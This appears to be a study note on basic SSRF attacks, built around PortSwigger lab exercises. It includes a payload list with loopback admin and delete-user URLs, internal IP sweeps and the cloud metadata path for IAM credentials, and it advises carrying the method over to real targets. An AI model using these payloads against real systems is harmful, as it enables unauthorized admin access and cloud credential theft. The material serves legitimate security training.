# SSRF - Basic (against the server & back-end systems)

Point a URL parameter at the server itself (`localhost`/`127.0.0.1`) or at internal hosts the app can reach but you can't. The response is reflected back to you, so you read internal admin pages directly. Impact: access-control bypass to admin functionality, internal-data read - High-Critical.

## Quick reference

```
# against the server (loopback admin, normally auth-gated but trusts local requests)
stockApi=http://localhost/admin
stockApi=http://localhost/admin/delete?username=carlos
# against other back-end systems (internal, non-routable)
stockApi=http://192.168.0.68/admin
# sweep the internal range with Burp Intruder on the final octet:
stockApi=http://192.168.0.§1§:8080/admin     (Numbers 1-255) -> find the 200
```
Decision list: full-URL param + reflected response -> try `localhost/admin`, then internal IPs; sweep the last octet to find the admin host; read the HTML for the action URL (delete user, etc.).

## Root cause
The server fetches the supplied URL and returns it; access controls assume requests to `localhost`/internal are trusted (front-end-only ACL, disaster-recovery no-auth, admin on a separate port). The SSRF makes the call *from* the trusted server.

## Find it
- Param holding a full URL (`stockApi`, `url`, image/preview fetchers). Confirm by pointing at `http://localhost/` and seeing the server's own home/admin content.
- For internal systems: try common private ranges `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, and ports `80/8080/8443`.

## Technique
**Against the server:** replace the URL with `http://localhost/admin` (or `127.0.0.1`). The admin interface - normally only reachable by authenticated users - renders because the request appears local. Read the HTML to find the privileged action URL, then submit that as the SSRF target.

**Against back-end systems:** the app server can reach internal hosts you can't. Aim at `http://<internal-ip>/admin`. If you don't know the IP, **sweep**: Burp Intruder on the final octet (1-255), sort by status, the `200` is the admin host. Then send the action URL.

**Advanced / edge:** try alternate schemes (`http`/`https`), non-standard ports, and cloud metadata `http://169.254.169.254/` (AWS IMDS -> `/latest/meta-data/iam/security-credentials/`). If filtered, go to `../Filter-bypass/`; if no response shown, `../Blind/`.

## Payload arsenal
```
http://localhost/                http://127.0.0.1/
http://localhost/admin           http://127.0.0.1/admin
http://localhost/admin/delete?username=carlos
http://192.168.0.§1§:8080/admin            # Intruder sweep
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://[::ffff:127.0.0.1]/       http://0.0.0.0/
```

## Bypasses
| Blocker | Bypass |
|---|---|
| don't know internal IP | Intruder sweep the octet; common ranges/ports |
| URL filtered | `../Filter-bypass/` |
| response not reflected | `../Blind/` |

## Exploitation walkthrough (basic against server)
1. `/admin` directly -> blocked (not authenticated).
2. Intercept the stock-check request; in Repeater set `stockApi=http://localhost/admin` -> admin interface HTML returns.
3. Read it -> action URL `http://localhost/admin/delete?username=carlos`.
4. Submit that as `stockApi` -> user deleted -> solved.

## Chaining
- -> [Access-control](../../Access-control/) (admin reach), cloud metadata -> IAM takeover.

## Tools
- **Burp Repeater** (swap URL), **Burp Intruder** (octet sweep, sort by status).

## Labs

### Basic SSRF against the local server [Apprentice]
URL: /web-security/ssrf/lab-basic-ssrf-against-localhost
- `stockApi=http://localhost/admin` -> admin page; submit `http://localhost/admin/delete?username=carlos`. Insight: loopback request bypasses the front-end ACL.

### Basic SSRF against another back-end system [Apprentice]
URL: /web-security/ssrf/lab-basic-ssrf-against-backend-system
- Intruder-sweep `http://192.168.0.§1§:8080/admin` (1-255), find the 200, then `/admin/delete?username=carlos`. Insight: the app server reaches internal hosts you can't; sweep to locate them.

Real-target transfer: any URL-fetching param - point at localhost/internal/metadata; sweep ranges; read the response for next-step URLs.

## Real-world notes
- The biggest real SSRF payoff is cloud metadata (`169.254.169.254`) -> temporary IAM credentials -> account takeover.
- Internal admin panels and unauthenticated internal services are the classic targets.
- On live targets, prove access (read a banner/metadata key); don't pivot destructively.

## References
- https://portswigger.net/web-security/ssrf
